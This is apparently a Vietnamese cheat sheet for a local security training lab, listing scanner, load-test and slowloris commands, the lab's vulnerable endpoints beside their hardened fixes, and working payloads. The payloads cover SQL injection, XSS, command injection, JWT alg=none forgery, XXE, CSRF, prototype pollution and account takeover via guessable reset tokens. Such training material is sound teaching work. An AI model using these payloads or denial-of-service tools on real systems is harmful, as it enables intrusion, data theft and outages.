# 04 · Cheat sheet — tất cả lệnh và payload của lab

> LƯU Ý Git Bash trên Windows: dùng cú pháp `--path=slow` (dấu `=`) để Git Bash
> không biến `/slow` thành `C:/Program Files/Git/slow`.

## Lệnh

```bash
npm run doctor                              # kiểm tra môi trường
npm run serve                               # lab VULN    → http://127.0.0.1:3000
npm run serve -- --port 3001                # lab VULN    ở port khác
npm run serve:hardened                      # lab HARDENED → http://127.0.0.1:3000
npm test                                    # 148 test (guard, ratelimiter, app, jwt, scraper, flowload, lab16-20, unit-gaps…)
npm run e2e                                 # 64 check E2E HTTP — tự khởi động 3 server, đối chứng vuln/hardened

node src/cli.js labs                        # danh sách bài thực hành
node src/cli.js hub                         # Hub học SecHub → http://127.0.0.1:4000

node src/cli.js recon    http://127.0.0.1:3000
node src/cli.js scan     http://127.0.0.1:3000               # báo cáo vào reports/
node src/cli.js scan     http://127.0.0.1:3000 --json        # + in JSON
node src/cli.js loadtest http://127.0.0.1:3000 --path=slow --rps 40 --duration 8
node src/cli.js flowtest http://127.0.0.1:3000 --users=6 --iterations=8 --think=150
node src/cli.js slowloris http://127.0.0.1:3000 --sockets 100 --duration 20
node src/cli.js crawl --url=https://example.com --max-pages=20 --depth=2    # web CÔNG KHAI, lịch sự
node src/cli.js crawl --url=http://127.0.0.1:3000 --i-own-this-target       # tập trên lab (guard ngược chiều)
node src/cli.js detect http://127.0.0.1:3000                                # blue-team: đọc /_lab/log, nhận diện tấn công
node src/cli.js challenge http://127.0.0.1:3000                             # CTF: 10 thử thách / 265 điểm
node src/cli.js codec encode b64 "xinchao"                                  # codec: b64/hex/url/rot13/sha256

# dải mạng riêng (10.x/172.16-31.x/192.168.x) — chỉ khi bạn SỞ HỮU hệ thống:
node src/cli.js scan http://192.168.1.50:3000 --i-own-this-target
```

> Ghi nhớ hướng guard: `loadtest`/`flowtest`/`slowloris`/`scan`/`recon` **chặn**
> web public, chỉ cho lab cục bộ và server bạn sở hữu; riêng `crawl` **cho phép**
> web public (cào lịch sự) nhưng mặc định chặn loopback/dải riêng.

## Endpoint của lab

| Endpoint | Lỗ hổng ở bản vuln | Bản hardened |
|---|---|---|
| `GET /search?q=` | SQLi (nối chuỗi) + reflected XSS | parameterized + escape |
| `POST /login` | SQLi bypass đăng nhập | parameterized + session có cờ |
| `GET /api/users/:id` | IDOR (đọc user khác, lộ apiKey) | 401/403 theo session |
| `GET /download?name=` | Path traversal (`../secrets.txt`) — VFS ảo | chặn `..` |
| `GET /files/` | Directory listing | 403 |
| `GET /admin` | Không kiểm tra quyền | 403 nếu không admin |
| `GET /tools/ping?host=` | **Command Injection** — nối chuỗi vào shell | whitelist + execFile |
| `POST /settings/email` | **CSRF** — không token, không kiểm Origin | CSRF token + Origin check |
| `POST /api/token` + `GET /api/profile` | **JWT yếu** — secret123 + nhận alg=none | khoá ngẫu nhiên + verify chặt |
| `GET /redirect?to=` | **Open Redirect** — 302 tới domain tuỳ ý | chỉ path nội bộ |
| `POST /upload` + `GET /uploads/` | **Unrestricted Upload** — .html chạy script | whitelist ext + ép text/plain |
| `POST /api/import` | **XXE** (mô phỏng trên VFS) | 400 với DOCTYPE |
| `GET/POST /guestbook` | **Stored XSS** | escape output |
| `POST /api/config` (+ GET) | **Prototype Pollution** — `{"__proto__":{...}}` nhiễm Object.prototype | safeMerge lọc `__proto__/constructor/prototype` |
| `POST /api/register` | **Mass Assignment** — copy cả `?role=admin` vào user | whitelist username+password, role cứng 'user' |
| `GET /track?code=` | **Blind SQLi** — oracle boolean 200/404 | parameterized query |
| `GET/POST /api/reset/*` | **Reset token đoán được** — md5(username) | randomBytes 128-bit + TTL + one-time |
| `GET /dom` | **DOM XSS** — `location.hash` → `innerHTML` | `textContent` |
| `GET /slow?ms=` | endpoint chậm 3s (mồi cho DoS demo) | vẫn chậm, nhưng rate limit bảo vệ |
| `GET /_lab/metrics` | bộ đếm request (dụng cụ học tập) | có |
| `GET /_lab/log` | log request cho module `detect` (kèm `status` sau khi response xong) | có |
| `GET /_lab/alerts` | phân tích log bằng `detect.js` → findings + rules (SOC feed cho `/blue`) | có |
| `GET /lab` | 🔴 **Red Team dashboard** — chọn mục tiêu, payload, nộp cờ CTF | có (banner đối chứng) |
| `GET /blue` | 🔵 **Blue Team SOC console** — live feed, alert cards, 16 rules, phòng thủ | có |
| `GET /_lab/challenges` + `/_lab/verify` | CTF: 10 thử thách, 265 điểm | CTF tắt (đã vá) |
| mọi 404/500 | phản chiếu URL / stack trace | trang lỗi chung chung |
| headers & cookie | thiếu CSP/nosniff…, cookie không cờ | đầy đủ |

## Payload thực hành (chỉ trên lab!)

```text
# SQL Injection — boolean-based (trả về TOÀN BỘ users)
/search?q=' OR 1=1 --

# SQL Injection — error-based (lộ thông báo CSDL)
/search?q='

# SQL Injection — bypass đăng nhập (POST /login)
username: ' OR 1=1 --     password: (tuỳ ý)

# Reflected XSS
/search?q=<svg/onload=alert(1)>
/khong-ton-tai<script>alert(1)</script>          # XSS qua trang 404

# IDOR
/api/users/1  →  /api/users/2  →  /api/users/3   # chưa đăng nhập vẫn đọc được

# Path traversal (VFS ảo của lab)
/download?name=../secrets.txt

# Command Injection (LAB-09) — nối lệnh sau host
/tools/ping?host=127.0.0.1 & whoami        # Windows (&)
/tools/ping?host=127.0.0.1; id             # Linux (;)
/tools/ping?host=127.0.0.1 & set SECLAB    # CTF #5: cờ trong env

# CSRF (LAB-10) — POST đổi email không token, Origin lạ
curl -X POST .../settings/email -H "Cookie: session=.." -H "Origin: https://evil.example" -d "email=x@x"

# JWT (LAB-11)
curl -X POST .../api/token -d "username=alice&password=alice123"
node src/cli.js jwt decode <token>
node src/cli.js jwt crack  <token>                          # → secret123
node src/cli.js jwt forge --payload='{"sub":"ctfsvc"}' --alg=none
curl ".../api/profile?token=<forged>"                       # → cờ CTF #6

# Open Redirect (LAB-12)
/redirect?to=https://example.com/phish

# Upload (LAB-13)
curl -X POST .../upload -d "name=poc.html&content=<script>alert(1)</script>"
curl .../uploads/poc.html    # vuln: text/html → script chạy

# XXE mô phỏng (LAB-14)
curl -X POST .../api/import -d '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///secrets.txt">]><i><item>&x;</item></i>'

# Stored XSS (LAB-15)
curl -X POST .../guestbook -d "msg=<svg/onload=alert(1)>"

# Prototype Pollution (LAB-16) — nhiễm Object.prototype toàn cục
curl -X POST .../api/config -H 'content-type: application/json' -d '{"__proto__":{"isAdmin":true}}'
curl .../api/config          # → protoPolluted:["isAdmin"] + cờ CTF #8

# Mass Assignment (LAB-17) — tự cấp role admin
curl -X POST ".../api/register?role=admin" -d "username=x&password=pw12345"
# login → GET /api/me → cờ CTF #9

# Blind SQLi (LAB-18) — oracle boolean, rút cờ từng ký tự (CTF #10, 40đ)
/track?code=AB-100' AND 1=1 --                                    # → 200
/track?code=AB-100' AND 1=2 --                                    # → 404
/track?code=AB-100' AND (SELECT substr(flag,1,1) FROM ctf_blind)='F' --  # → 200 ✓

# Reset token đoán được (LAB-19) — md5(username)[0:12], chiếm account
curl ".../api/reset/request?user=carol"        # token lộ ngay response
curl -X POST .../api/reset/confirm -d "user=dave&token=<md5(dave)[0:12]>&newpass=x"

# DOM XSS (LAB-20) — payload trong #fragment, KHÔNG lên server
/dom#<img src=x onerror=alert(document.domain)>        # mở trong trình duyệt

# So sánh rate limit
loadtest --path=slow --rps 40   →  vuln: 200 nghẽn 3s   |   hardened: 429 dồn dập
slowloris --sockets 100         →  vuln: giữ 100        |   hardened: cắt ~90
```

## Quy trình "pentest mini" 10 phút (chuẩn lab)

```bash
# 1. mở 2 terminal
npm run serve                 # terminal 1 — mục tiêu
# terminal 2:
node src/cli.js recon http://127.0.0.1:3000        # 2. thu thập thông tin
node src/cli.js scan  http://127.0.0.1:3000        # 3. quét → đọc báo cáo
# 4. khai thác thủ công bằng payload ở trên (trình duyệt hoặc curl)
# 5. đo tác động
node src/cli.js loadtest http://127.0.0.1:3000 --path=slow --rps 40 --duration 6
# 6. đổi sang bản đã vá, lặp lại 2–5 và SO SÁNH báo cáo
npm run serve:hardened -- --port 3001
node src/cli.js scan http://127.0.0.1:3001
# 7. viết 1 đoạn tổng kết: đã phát hiện gì → đã vá gì → bằng chứng ở đâu
```
